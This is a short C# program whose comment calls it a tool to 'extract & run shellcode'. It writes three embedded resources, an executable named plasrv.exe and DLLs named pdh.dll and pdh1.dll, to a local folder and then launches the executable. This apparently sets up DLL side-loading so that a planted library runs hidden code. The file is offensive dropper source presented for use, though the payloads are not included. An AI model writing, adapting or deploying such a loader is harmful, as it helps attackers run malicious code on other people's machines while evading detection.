// dotnet program to extract & run shellcode

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.IO;

namespace Pack2
{
    class Program
    {
        static void Main(string[] args)
        {
            extract("Pack2", "C:\\Users\\s3th\\Desktop\\test\\", "plasrv.exe");
            extract("Pack2", "C:\\Users\\s3th\\Desktop\\test\\", "pdh.dll");
            extract("Pack2", "C:\\Users\\s3th\\Desktop\\test\\", "pdh1.dll");
            Process.Start("C:\\Users\\s3th\\Desktop\\test\\plasrv.exe");
        }
        private static void extract(string nameSpace, string outDirectory, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
    }
}
